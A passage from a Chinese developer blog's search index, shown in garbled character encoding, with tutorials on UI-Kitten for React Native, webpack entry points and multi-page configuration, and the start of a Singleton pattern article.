\u0026#39;Details\u0026#39;]\r];\rconst [selectedIndex, setSelectedIndex] = React.useState(new IndexPath(0));//2.åˆå§‹åŒ–é€‰ä¸­çŠ¶æ€\rreturn (\r//3.ä»¥indexä½œä¸ºåˆ¤æ–­ä¾æ®å®ç°å¯¼èˆªæ¡ä»¶\r\u0026lt;Drawer\rselectedIndex={selectedIndex}\ronSelect={index =\u0026gt; {\rsetSelectedIndex(index)\rif (index.section != undefined) {\rlet sectionRoute = routes[index.section][index.row];\rnavigation.navigate(sectionRoute);\r} else if (index.section == undefined) {\rnavigation.navigate(state.routeNames[index.row])\r}\r}}\r\u0026gt;\r\u0026lt;DrawerItem title=\u0026#39;Users\u0026#39;/\u0026gt;\r\u0026lt;DrawerItem title=\u0026#39;Orders\u0026#39;/\u0026gt;\r\u0026lt;DrawerGroup title=\u0026#39;AkveoDesign\u0026#39;\u0026gt;\r\u0026lt;DrawerItem title=\u0026#39;EvaDesign\u0026#39;/\u0026gt;\r\u0026lt;DrawerItem title=\u0026#39;News\u0026#39;/\u0026gt;\r\u0026lt;DrawerItem title=\u0026#39;Details\u0026#39;/\u0026gt;\r\u0026lt;/DrawerGroup\u0026gt;\r\u0026lt;/Drawer\u0026gt;\r)\r}; äºŒã€è‡ªå®šä¹‰æ˜ å°„ï¼ˆUI-Kittenï¼‰ Step.1 åˆ›å»ºæ˜ å°„\nå·¥ç¨‹æ ¹ç›®å½•æ–°å»º mapping.json æ–‡ä»¶ï¼Œ\nè¯¥é…ç½®æ–‡ä»¶ç¨åç”±Evaè®¾è®¡ç³»ç»Ÿå¤„ç†å™¨å¤„ç†ï¼Œä»¥æä¾›ç»„ä»¶æ‰€åº”ç”¨çš„æœ€ç»ˆæ ·å¼ã€‚\n//æ–‡æœ¬textæ ·å¼\r{\r\u0026#34;strict\u0026#34;: {\r\u0026#34;text-font-family\u0026#34;: \u0026#34;OpenSans-Regular\u0026#34;,\r\u0026#34;text-heading-1-font-size\u0026#34;: 36,\r\u0026#34;text-heading-1-font-weight\u0026#34;: \u0026#34;800\u0026#34;,\r\u0026#34;text-heading-1-font-family\u0026#34;: \u0026#34;OpenSans-Bold\u0026#34;,\r// Same for `h2...h6`\r\u0026#34;text-subtitle-1-font-size\u0026#34;: 15,\r\u0026#34;text-subtitle-1-font-weight\u0026#34;: \u0026#34;600\u0026#34;,\r\u0026#34;text-subtitle-1-font-family\u0026#34;: \u0026#34;OpenSans-SemiBold\u0026#34;,\r// Same for `s2`\r\u0026#34;text-paragraph-1-font-size\u0026#34;: 15,\r\u0026#34;text-paragraph-1-font-weight\u0026#34;: \u0026#34;400\u0026#34;,\r\u0026#34;text-paragraph-1-font-family\u0026#34;: \u0026#34;OpenSans-Regular\u0026#34;,\r// Same for `p2`\r\u0026#34;text-caption-1-font-size\u0026#34;: 12,\r\u0026#34;text-caption-1-font-weight\u0026#34;: \u0026#34;400\u0026#34;,\r\u0026#34;text-caption-1-font-family\u0026#34;: \u0026#34;OpenSans-Regular\u0026#34;,\r// Same for `c2`\r\u0026#34;text-label-font-size\u0026#34;: 12,\r\u0026#34;text-label-font-weight\u0026#34;: \u0026#34;800\u0026#34;,\r\u0026#34;text-label-font-family\u0026#34;: \u0026#34;OpenSans-Bold\u0026#34;\r}\r} step.2 æ›´æ”¹å•ä¸ªå‚æ•°\nä¸ºäº†æ›´æ”¹é»˜è®¤å‚æ•°ï¼Œæ‚¨éœ€è¦æ‰¾å‡ºå®ƒçš„å£°æ˜ä½ç½®ï¼ˆ/node_modules/@eva-design/eva/mapping.jsonï¼‰ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿæµè§ˆæœ‰å…³ç»„ä»¶çš„å…ƒä¿¡æ¯ã€‚\n//æ–‡æœ¬textæ ·å¼\r{\r\u0026#34;strict\u0026#34;: {\r\u0026#34;text-font-family\u0026#34;: \u0026#34;OpenSans-Regular\u0026#34;,\r- \u0026#34;text-heading-1-font-size\u0026#34;: 36,\r+ \u0026#34;text-heading-1-font-size\u0026#34;: 66, step.3 å®ç°æ˜ å°„\n metro.config.jsä¸­é…ç½®ä»¥ä¸‹ä»£ç ï¼š\n const MetroConfig = require(\u0026#39;@ui-kitten/metro-config\u0026#39;);\rconst evaConfig = {\revaPackage: \u0026#39;@eva-design/eva\u0026#39;,\r++ customMappingPath: \u0026#39;./path-to/mapping.json\u0026#39;,\r};\rmodule.exports = MetroConfig.create(evaConfig, {\r// Whatever was previously specified\r}); ä¸‰ã€ä¸»é¢˜å®šåˆ¶ï¼ˆUI-Kittenï¼‰ Step.1 Eva-Color\nEva-colorä¸­è‡ªå®šä¹‰é…ç½®é¢œè‰²ï¼Œexport theme.jsonæ–‡ä»¶ï¼Œæ”¾å…¥å·¥ç¨‹ä¸­ã€‚\nStep.2 App.js\nimport React from \u0026#39;react\u0026#39;;\rimport * as eva from \u0026#39;@eva-design/eva\u0026#39;;\rimport { ApplicationProvider, Layout, Button } from \u0026#39;@ui-kitten/components\u0026#39;;\rimport { default as theme } from \u0026#39;./theme.json\u0026#39;; // \u0026lt;-- Import app theme\rexport default () =\u0026gt; (\r\u0026lt;ApplicationProvider {...eva} theme={{ ...eva.dark, ...theme }}\u0026gt;\r\u0026lt;Layout style={{ flex: 1, justifyContent: \u0026#39;center\u0026#39;, alignItems: \u0026#39;center\u0026#39; }}\u0026gt;\r\u0026lt;Button\u0026gt;HOME\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r\u0026lt;/ApplicationProvider\u0026gt;\r); å››ã€ä½¿ç”¨ç¬¬ä¸‰æ–¹å›¾æ ‡åŒ…ï¼ˆUI-Kittenï¼‰ Step.1 å®‰è£… vector-icons\nnpm install --save react-native-vector-icons Step.2 é…ç½®ï¼ˆandroidï¼‰\n// android/app/build.gradleæ–‡ä»¶ä¸­æ·»åŠ \rapply from: \u0026#34;../../node_modules/react-native-vector-icons/fonts.gradle\u0026#34; Step.3 åˆ›å»ºå›¾æ ‡é€‚é…å™¨\n// åˆ›å»ºä¸€ä¸ªfeather-icons.jsæ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­æ”¾ç½®ä»¥ä¸‹ä»£ç ã€‚\rimport React from \u0026#39;react\u0026#39;;\rimport { StyleSheet } from \u0026#39;react-native\u0026#39;;\rimport Icon from \u0026#39;react-native-vector-icons/Feather\u0026#39;;\rexport const FeatherIconsPack = {\rname: \u0026#39;feather\u0026#39;,\ricons: createIconsMap(),\r};\rfunction createIconsMap() {\rreturn new Proxy({}, {\rget(target, name) {\rreturn IconProvider(name);\r},\r});\r}\rconst IconProvider = (name) =\u0026gt; ({\rtoReactElement: (props) =\u0026gt; FeatherIcon({ name, ...props }),\r});\rfunction FeatherIcon({ name, style }) {\rconst { height, tintColor, ...iconStyle } = StyleSheet.flatten(style);\rreturn (\r\u0026lt;Icon name={name} size={height} color={tintColor} style={iconStyle} /\u0026gt;\r);\r} Step.4 æ³¨å†Œå›¾æ ‡\nimport React from \u0026#39;react\u0026#39;;\rimport * as eva from \u0026#39;@eva-design/eva\u0026#39;;\rimport { ApplicationProvider, IconRegistry, Layout, Text } from \u0026#39;@ui-kitten/components\u0026#39;;\r++ import { FeatherIconsPack } from \u0026#39;./feather-icons\u0026#39;;\rconst HomeScreen = () =\u0026gt; (\r\u0026lt;Layout style={{flex: 1, justifyContent: \u0026#39;center\u0026#39;, alignItems: \u0026#39;center\u0026#39;}}\u0026gt;\r\u0026lt;Text category=\u0026#39;h1\u0026#39;\u0026gt;HOME\u0026lt;/Text\u0026gt;\r\u0026lt;/Layout\u0026gt;\r);\rexport default () =\u0026gt; (\r\u0026lt;\u0026gt;\r++ \u0026lt;IconRegistry icons={FeatherIconsPack} /\u0026gt;\r\u0026lt;ApplicationProvider {...eva} theme={eva.light}\u0026gt;\r\u0026lt;HomeScreen /\u0026gt;\r\u0026lt;/ApplicationProvider\u0026gt;\r\u0026lt;/\u0026gt;\r); Step.5 ä½¿ç”¨\nimport React from \u0026#39;react\u0026#39;;\rimport { Button, Icon } from \u0026#39;@ui-kitten/components\u0026#39;;\rexport const FacebookIcon = (props) =\u0026gt; (\r\u0026lt;Icon name=\u0026#39;facebook\u0026#39; {...props} /\u0026gt;\r);\rexport const LoginButton = () =\u0026gt; (\r\u0026lt;Button accessoryLeft={FacebookIcon}\u0026gt;Login with Facebook\u0026lt;/Button\u0026gt;\r); äº”ã€Expo\u0026amp;UI-Kittenï¼ˆwebç«¯æŠ¥é”™çš„é—®é¢˜ï¼‰ è§£å†³åŠæ³•ï¼š\n//1.å®‰è£…\rexpo install @expo/webpack-config\r//2.æ ¹ç›®å½•æ–°å»º`webpack.config.js`æ·»åŠ \rconst createExpoWebpackConfigAsync = require(\u0026#39;@expo/webpack-config\u0026#39;);\rmodule.exports = async function(env, argv) {\rconst config = await createExpoWebpackConfigAsync({\r...env,\rbabel: {\rdangerouslyAddModulePathsToTranspile: [\u0026#39;@ui-kitten/components\u0026#39;]\r}\r}, argv);\rreturn config;\r}; ","description":"","id":44,"section":"react-native","tags":null,"title":"UI-Kitten æœ€ä½³å®è·µ","uri":"https://codthing.github.io/react-native/ui/ui-kitten/kitten-bp/"},{"content":"ä¸€ã€å…¥å£ ï¼ˆentryï¼‰ #.å•ä¸ªå…¥å£ï¼ˆç®€å†™/æ•°ç»„ï¼‰è¯­æ³•   ç”¨æ³•ï¼šentry: string | [string]\n  ä¼˜ç¼ºç‚¹ï¼šé€šè¿‡ä¸€ä¸ªå…¥å£ï¼ˆä¾‹å¦‚ä¸€ä¸ªåº“ï¼‰ä¸ºåº”ç”¨ç¨‹åºè®¾ç½® webpack é…ç½®æ—¶ï¼Œå•ä¸€å…¥å£æ˜¯ä¸é”™çš„é€‰æ‹©ã€‚ç„¶è€Œï¼Œè¿™ç§è¯­æ³•æ‰©å±•é…ç½®çš„çµæ´»æ€§ä¸å¤§ã€‚\n   webpack.config.js\n module.exports = {\rentry: { main: \u0026#39;./path/to/my/entry/file.js\u0026#39; } }\r// æˆ–è€…ï¼Œæ³¨å…¥å¤šä¸ªä¾èµ–æ–‡ä»¶ï¼Œå¹¶å°†ä¾èµ–å…³ç³»ç»˜åˆ¶åœ¨ä¸€ä¸ªâ€œchunkâ€ä¸­\rmodule.exports = {\rentry: [\u0026#39;./src/file_1.js\u0026#39;,\u0026#39;./src/file_2.js\u0026#39;],\routput: {\rfilename: \u0026#39;bundle.js\u0026#39;\r}\r} #.å¯¹è±¡è¯­æ³• âœ”   ç”¨æ³•ï¼šentry: { string | [string] } | { }\n  ä¼˜ç¼ºç‚¹ï¼šå¯¹è±¡è¯­æ³•ä¼šæ¯”è¾ƒç¹çã€‚ç„¶è€Œï¼Œè¿™æ˜¯åº”ç”¨ç¨‹åºä¸­å®šä¹‰å…¥å£çš„æœ€å¯æ‰©å±•çš„æ–¹å¼ã€‚\n  å¯¹è±¡å±æ€§ï¼š\n   dependOn: å½“å‰å…¥å£æ‰€ä¾èµ–çš„å…¥å£ã€‚å¿…é¡»åœ¨è¯¥å…¥å£è¢«åŠ è½½å‰è¢«åŠ è½½ã€‚ filename: æŒ‡å®šè¦è¾“å‡ºçš„æ–‡ä»¶åç§°ã€‚ import: å¯åŠ¨æ—¶éœ€åŠ è½½çš„æ¨¡å—ã€‚ library: library çš„ç›¸å…³é€‰é¡¹ã€‚ runtime: è¿è¡Œæ—¶ chunk çš„åå­—ã€‚å¦‚æœè®¾ç½®äº†ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªä»¥è¿™ä¸ªåå­—å‘½åçš„è¿è¡Œæ—¶ chunkï¼Œå¦åˆ™å°†ä½¿ç”¨ç°æœ‰çš„å…¥å£ä½œä¸ºè¿è¡Œæ—¶ã€‚   æ³¨æ„äº‹é¡¹ï¼š   runtime å’Œ dependOn ä¸èƒ½åœ¨åŒä¸€ä¸ªå…¥å£ä¸ŠåŒæ—¶ä½¿ç”¨ ç¡®ä¿ runtime ä¸èƒ½æŒ‡å‘å·²å­˜åœ¨çš„å…¥å£åç§° dependOn ä¸èƒ½å¾ªç¯å¼•ç”¨  // âœ”\rmodule.exports = {\rentry: {\rapp: \u0026#39;./src/app.js\u0026#39;,\radminApp: \u0026#39;./src/adminApp.js\u0026#39;,\r},\r};\r// âœ”\rmodule.exports = {\rentry: {\ra2: \u0026#39;dependingfile.js\u0026#39;,\rb2: {\rdependOn: \u0026#39;a2\u0026#39;,\rimport: \u0026#39;./src/app.js\u0026#39;,\r},\r},\r};\r// Ã— `runtime` å’Œ `dependOn` ä¸èƒ½åœ¨åŒä¸€ä¸ªå…¥å£ä¸ŠåŒæ—¶ä½¿ç”¨\rmodule.exports = {\rentry: {\ra2: \u0026#39;./a\u0026#39;,\rb2: {\rruntime: \u0026#39;x2\u0026#39;,\rdependOn: \u0026#39;a2\u0026#39;,\rimport: \u0026#39;./b\u0026#39;,\r},\r},\r};\r// Ã— `runtime` ä¸èƒ½æŒ‡å‘å·²å­˜åœ¨çš„å…¥å£åç§°\rmodule.exports = {\rentry: {\ra1: \u0026#39;./a\u0026#39;,\rb1: {\rruntime: \u0026#39;a1\u0026#39;,\rimport: \u0026#39;./b\u0026#39;,\r},\r},\r};\r// Ã— `dependOn` ä¸èƒ½å¾ªç¯å¼•ç”¨\rmodule.exports = {\rentry: {\ra3: {\rimport: \u0026#39;./a\u0026#39;,\rdependOn: \u0026#39;b3\u0026#39;,\r},\rb3: {\rimport: \u0026#39;./b\u0026#39;,\rdependOn: \u0026#39;a3\u0026#39;,\r},\r},\r}; äºŒã€å¸¸è§åœºæ™¯ #.åˆ†ç¦» app(åº”ç”¨ç¨‹åº) å’Œ vendor(ç¬¬ä¸‰æ–¹åº“) å…¥å£ // ä½¿ç”¨ optimization.splitChunks é»˜è®¤é…ç½®\r// webpack.config.js\rmodule.exports = {\rentry: {\rmain: \u0026#39;./src/app.js\u0026#39;\r},\r//...\roptimization: {\rsplitChunks: {\rchunks: \u0026#39;async\u0026#39;,\rminSize: 20000,\rminRemainingSize: 0,\rmaxSize: 0,\rminChunks: 1,\rmaxAsyncRequests: 30,\rmaxInitialRequests: 30,\renforceSizeThreshold: 50000,\rcacheGroups: {\rdefaultVendors: {\rtest: /[\\\\/]node_modules[\\\\/]/,\rpriority: -10,\rreuseExistingChunk: true,\r},\rdefault: {\rminChunks: 2,\rpriority: -20,\rreuseExistingChunk: true,\r},\r},\r},\r},\r}; #.å¤šé¡µé¢åº”ç”¨ç¨‹åº // webpack.config.js\rmodule.exports = {\rentry: {\rpageOne: \u0026#39;./src/pageOne/index.js\u0026#39;,\rpageTwo: \u0026#39;./src/pageTwo/index.js\u0026#39;,\rpageThree: \u0026#39;./src/pageThree/index.js\u0026#39;,\r},\r}; ","description":"","id":45,"section":"others","tags":null,"title":"webpack åŸºç¡€","uri":"https://codthing.github.io/others/webpack/webpack-base/"},{"content":"é™æ€ç½‘ç«™ï¼Œå¤šä¸ªhtmlé¡µé¢ï¼ˆéSPAï¼‰ï¼ŒWebPacké…ç½® (åŸºç¡€ç¯‡)\nStep1. åˆå§‹åŒ–é¡¹ç›® mkdir multiple-htmlpages \u0026amp;\u0026amp; cd multiple-htmlpages\ryarn init\ryarn add -D webpack webpack-cli webpack-dev-server html-webpack-plugin\rmkdir src \u0026amp;\u0026amp; cd src\recho \u0026gt;index.html\recho \u0026gt;index.js //index.jsä¸­çš„å†…å®¹ä¿æŒç©º\r//index.htmlä¸­æ·»åŠ å†…å®¹\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\r\u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt;\r\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;é¦–é¡µ\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;h1 class=\u0026#34;page-title\u0026#34;\u0026gt;é¦–é¡µ\u0026lt;/h1\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; Step2. é…ç½®å¼€å‘æœåŠ¡å™¨  1.webpack.dev.js\n echo \u0026gt;webpack.dev.js //webpack.dev.jsä¸­æ·»åŠ å†…å®¹\rconst HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;);\rmodule.exports = {\r// https://webpack.js.org/concepts/entry-points/#multi-page-application\rentry: {\rindex: \u0026#39;./src/index.js\u0026#39;\r},\r// https://webpack.js.org/configuration/dev-server/\rdevServer: {\rport: 8080\r},\r// https://webpack.js.org/concepts/plugins/\rplugins: [\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/index.html\u0026#39;,\rinject: true,\rchunks: [\u0026#39;index\u0026#39;],\rfilename: \u0026#39;index.html\u0026#39;\r})\r]\r};  package.json   {\r\u0026#34;name\u0026#34;: \u0026#34;multiple-htmlpages\u0026#34;,\r\u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;,\r\u0026#34;description\u0026#34;: \u0026#34;é™æ€ç½‘ç«™ï¼Œå¤šä¸ªhtmlé¡µé¢ï¼ŒWebPacké…ç½®\u0026#34;,\r\u0026#34;author\u0026#34;: \u0026#34;fungmo\u0026#34;,\r\u0026#34;license\u0026#34;: \u0026#34;MIT\u0026#34;,\r\u0026#34;scripts\u0026#34;: {\r\u0026#34;start\u0026#34;: \u0026#34;webpack serve --config webpack.dev.js --mode development\u0026#34;\r},\r\u0026#34;devDependencies\u0026#34;: {\r\u0026#34;html-webpack-plugin\u0026#34;: \u0026#34;^5.3.1\u0026#34;,\r\u0026#34;webpack\u0026#34;: \u0026#34;^5.30.0\u0026#34;,\r\u0026#34;webpack-cli\u0026#34;: \u0026#34;^4.6.0\u0026#34;,\r\u0026#34;webpack-dev-server\u0026#34;: \u0026#34;^3.11.2\u0026#34;\r} }  yarn start å¯åŠ¨æœåŠ¡å™¨   Step3. æ·»åŠ æ›´å¤š HTML é¡µé¢ echo \u0026gt;about.html\recho \u0026gt;about.js\recho \u0026gt;contacts.html\recho \u0026gt;contacts.js const HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;);\rmodule.exports = {\r// https://webpack.js.org/concepts/entry-points/#multi-page-application\rentry: {\rindex: \u0026#39;./src/index.js\u0026#39;,\rabout: \u0026#39;./src/about.js\u0026#39;,\rcontacts: \u0026#39;./src/contacts.js\u0026#39;\r},\r// https://webpack.js.org/configuration/dev-server/\rdevServer: {\rport: 8080\r},\r// https://webpack.js.org/concepts/plugins/\rplugins: [\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/index.html\u0026#39;,\rinject: true,\rchunks: [\u0026#39;index\u0026#39;],\rfilename: \u0026#39;index.html\u0026#39;\r}),\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/about.html\u0026#39;,\rinject: true,\rchunks: [\u0026#39;about\u0026#39;],\rfilename: \u0026#39;about.html\u0026#39;\r}),\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/contacts.html\u0026#39;,\rinject: true,\rchunks: [\u0026#39;contacts\u0026#39;],\rfilename: \u0026#39;contacts.html\u0026#39;\r})\r]\r}; Step4. æ·»åŠ CSS yarn add normalize.css //index.jsã€about.jsã€contacts.js ä¸­ï¼Œé¡¶éƒ¨æ·»åŠ \rimport \u0026#39;normalize.css/normalize.css\u0026#39;; yarn add -D css-loader style-loader //webpack.dev.js\rconst HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;);\rmodule.exports = {\r...\rmodule: {\rrules: [\r{\rtest: /\\.css$/,\ruse: [\r\u0026#39;style-loader\u0026#39;,\r\u0026#39;css-loader\u0026#39;\r]\r}\r]\r}\r}; Step5. ä½¿ç”¨æœ€æ–°çš„JavaScriptè¯­è¨€ yarn add -D @babel/core babel-loader @babel/preset-env //webpack.dev.js\rconst HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;);\rmodule.exports = {\r...\rmodule: {\rrules: [\r{\rtest: /\\.js$/,\rexclude: /node_modules/,\rloader: \u0026#39;babel-loader\u0026#39;,\roptions: {\rpresets: [\u0026#39;@babel/preset-env\u0026#39;]\r}\r},\r]\r}\r}; Step6. ç”Ÿäº§å‘å¸ƒ  å‹ç¼©cssï¼Œjsæ–‡ä»¶ï¼Œå› ä¸ºå­—èŠ‚å¾ˆé‡è¦ï¼› åœ¨å‹ç¼©æ–‡ä»¶çš„åç§°ä¸Šæ·»åŠ ä¸€ä¸ªå“ˆå¸Œï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é…ç½®æœåŠ¡å™¨ä»¥ä¸ºå…·æœ‰é€‚å½“ç¼“å­˜å¤´çš„æœåŠ¡å™¨æä¾›æœåŠ¡ï¼Œå¹¶ç¡®ä¿¡æµè§ˆå™¨ä»ä¼šè·å–æ–°ç‰ˆæœ¬ï¼› ç¡®ä¿åœ¨htmlä¸­ä½¿ç”¨äº†æ­£ç¡®çš„æ–‡ä»¶åï¼› å°†ç”Ÿæˆçš„æ–‡ä»¶å­˜å‚¨åœ¨é…ç½®çš„ä½ç½®ï¼›   1.å¯ä»¥ä½¿ç”¨ç°æœ‰çš„ webpack.dev.js å¹¶åœ¨å†…éƒ¨è¿›è¡Œé…ç½®ï¼Œä»¥åŒºåˆ†ç”Ÿäº§å’Œå¼€å‘ç¯å¢ƒæ¥æ‰§è¡Œä¸Šè¿°ä»»åŠ¡ã€‚ ä½†éšåå˜å¾—æœ‰ç‚¹å¤æ‚ä¸”éš¾ä»¥é˜…è¯»ã€‚ å› æ­¤ï¼Œæ–°å»ºä¸€ä¸ª webpack.prod.js é…ç½®æ–‡ä»¶ã€‚ é¦–å…ˆå®‰è£…æ›´å¤šçš„ä¾èµ–é¡¹æ¥å¸®åŠ©æˆ‘ä»¬è¿›è¡Œå‹ç¼©å’Œä¼˜åŒ–ï¼š\n yarn add -D clean-webpack-plugin mini-css-extract-plugin optimize-css-assets-webpack-plugin http-server  2.é…ç½® webpack.prod.js\n echo \u0026gt;webpack.prod.js // webpack.prod.js\rconst path = require(\u0026#39;path\u0026#39;);\rconst { CleanWebpackPlugin } = require(\u0026#39;clean-webpack-plugin\u0026#39;); const HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;);\rconst MiniCssExtractPlugin = require(\u0026#34;mini-css-extract-plugin\u0026#34;);\rconst OptimizeCssAssetsPlugin = require(\u0026#39;optimize-css-assets-webpack-plugin\u0026#39;);\rconst buildPath = path.resolve(__dirname, \u0026#39;dist\u0026#39;);\rmodule.exports = {\r// This option controls if and how source maps are generated.\r// https://webpack.js.org/configuration/devtool/\rdevtool: \u0026#39;source-map\u0026#39;,\r// https://webpack.js.org/concepts/entry-points/#multi-page-application\rentry: {\rindex: \u0026#39;./src/index.js\u0026#39;,\rabout: \u0026#39;./src/about.js\u0026#39;,\rcontacts: \u0026#39;./src/contacts.js\u0026#39;\r},\r// how to write the compiled files to disk\r// https://webpack.js.org/concepts/output/\routput: {\rfilename: \u0026#39;[name].[hash:20].js\u0026#39;,\rpath: buildPath\r},\r// https://webpack.js.org/concepts/loaders/\rmodule: {\rrules: [\r{\rtest: /\\.js$/,\rexclude: /node_modules/,\rloader: \u0026#39;babel-loader\u0026#39;,\roptions: {\rpresets: [\u0026#39;@babel/preset-env\u0026#39;]\r}\r},\r{\rtest: /\\.css$/,\ruse: [\rMiniCssExtractPlugin.loader,\r\u0026#34;css-loader\u0026#34;\r]\r}\r]\r},\r// https://webpack.js.org/concepts/plugins/\rplugins: [\rnew CleanWebpackPlugin(),\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/index.html\u0026#39;,\rinject: \u0026#39;body\u0026#39;,\rchunks: [\u0026#39;index\u0026#39;],\rfilename: \u0026#39;index.html\u0026#39;\r}),\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/about.html\u0026#39;,\rinject: \u0026#39;body\u0026#39;,\rchunks: [\u0026#39;about\u0026#39;],\rfilename: \u0026#39;about.html\u0026#39;\r}),\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/contacts.html\u0026#39;,\rinject: \u0026#39;body\u0026#39;,\rchunks: [\u0026#39;contacts\u0026#39;],\rfilename: \u0026#39;contacts.html\u0026#39;\r}),\rnew MiniCssExtractPlugin({\rfilename: \u0026#34;[name].[contenthash].css\u0026#34;,\rchunkFilename: \u0026#34;[id].[contenthash].css\u0026#34;\r})\r],\r// https://webpack.js.org/configuration/optimization/\roptimization: {\rminimize: true,\rminimizer: [\rnew OptimizeCssAssetsPlugin({})\r]\r}\r};  3.é…ç½® package.json\n \u0026#34;scripts\u0026#34;: {\r\u0026#34;start\u0026#34;: \u0026#34;webpack serve --config webpack.dev.js --mode development\u0026#34;,\r\u0026#34;build\u0026#34;: \u0026#34;webpack --config webpack.prod.js --mode production\u0026#34;,\r\u0026#34;preview\u0026#34;: \u0026#34;yarn build \u0026amp;\u0026amp; http-server dist\u0026#34;\r},  4.è¦åœ¨æœ¬åœ°æ„å»ºå’Œé¢„è§ˆç½‘ç«™ï¼Œè¯·è¿è¡Œï¼š\n yarn preview ","description":"","id":46,"section":"others","tags":null,"title":"webpack å®è·µ","uri":"https://codthing.github.io/others/webpack/webpack-adv/"},{"content":"å•ä¾‹ï¼ˆç»Ÿä¸€ç”¨åè¯ Singleton ä»£æ›¿ï¼‰æ˜¯å¯ä»¥å®ä¾‹åŒ–ä¸€æ¬¡çš„ç±»ï¼Œå¹¶ä¸”å¯ä»¥å…¨å±€è®¿é—®ã€‚å•ä¸ªå®ä¾‹å¯ä»¥åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­å…±äº«ï¼Œéå¸¸é€‚åˆç®¡ç†åº”ç”¨ç¨‹åºä¸­çš„å…¨å±€çŠ¶æ€ã€‚\n\rè®¡æ•°å™¨æ¡ˆä¾‹ æ„å»ºä¸€ä¸ªCounterè®¡æ•°å™¨å…·æœ‰ä»¥ä¸‹å†…å®¹çš„ç±»ï¼š\n è¿”å›å®ä¾‹å€¼çš„ getInstance æ–¹æ³• è¿”å›è®¡æ•°å™¨å˜é‡å½“å‰å€¼çš„ getCount æ–¹æ³• å°†è®¡æ•°å™¨çš„å€¼ +1 çš„ increment æ–¹æ³• å°†è®¡æ•°å™¨çš„å€¼ -1 çš„ decrement æ–¹æ³•  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  let counter = 0; class Counter { getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } }   ç„¶è€Œï¼Œè¿™ä¸ªç±»ä¸ç¬¦åˆ Singleton çš„æ ‡å‡†ï¼ Singleton åº”è¯¥åªèƒ½è¢«å®ä¾‹åŒ–ä¸€æ¬¡ã€‚ ä¸Šä¾‹å¯ä»¥åˆ›å»º Counter ç±»çš„å¤šä¸ªå®ä¾‹ã€‚å¯éªŒè¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  let counter = 0; class Counter { getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } } const counter1 = new Counter(); const counter2 = new Counter(); console.log(counter1.getInstance() === counter2.getInstance()); // false   é€šè¿‡ä¸¤æ¬¡è°ƒç”¨æ–°æ–¹æ³•ï¼Œå‘ç° counter1 å’Œ counter2 è¢«è®¾ç½®ä¸ºä¸ç›¸ç­‰çš„å®ä¾‹ã€‚\ncounter1 å’Œ counter2 ä¸Šçš„ getInstance æ–¹æ³•è¿”å›çš„å€¼æœ‰æ•ˆåœ°è¿”å›äº†å¯¹ä¸åŒå®ä¾‹çš„å¼•ç”¨ã€‚\n\rå¦‚ä½•ç¡®ä¿åªèƒ½åˆ›å»ºç±»çš„ä¸€ä¸ªå®ä¾‹ï¼Ÿ   ç¡®ä¿åªèƒ½åˆ›å»ºä¸€ä¸ªå®ä¾‹çš„ä¸€ç§æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªåä¸º instance çš„å˜é‡ã€‚\n  åœ¨ Counter çš„æ„é€ å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åˆ›å»ºæ–°å®ä¾‹æ—¶å°† instance è®¾ç½®ä¸ºå¯¹å®ä¾‹çš„å¼•ç”¨ã€‚\n  æˆ‘ä»¬å¯ä»¥é€šè¿‡æ£€æŸ¥å®ä¾‹å˜é‡æ˜¯å¦å·²ç»æœ‰å€¼æ¥é˜²æ­¢æ–°çš„å®ä¾‹åŒ–ï¼Œå¹¶é€šè¿‡ throw è¯­å¥æŠ›å‡ºé”™è¯¯æç¤ºã€‚\n  throw è¯­å¥ç”¨æ¥æŠ›å‡ºä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„å¼‚å¸¸ã€‚å½“å‰å‡½æ•°çš„æ‰§è¡Œå°†è¢«åœæ­¢ï¼ˆthrowä¹‹åçš„è¯­å¥å°†ä¸ä¼šæ‰§è¡Œï¼‰ï¼Œå¹¶ä¸”æ§åˆ¶å°†è¢«ä¼ é€’åˆ°è°ƒç”¨å †æ ˆä¸­çš„ç¬¬ä¸€ä¸ªcatchå—ã€‚å¦‚æœè°ƒç”¨è€…å‡½æ•°ä¸­æ²¡æœ‰catchå—ï¼Œç¨‹åºå°†ä¼šç»ˆæ­¢ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 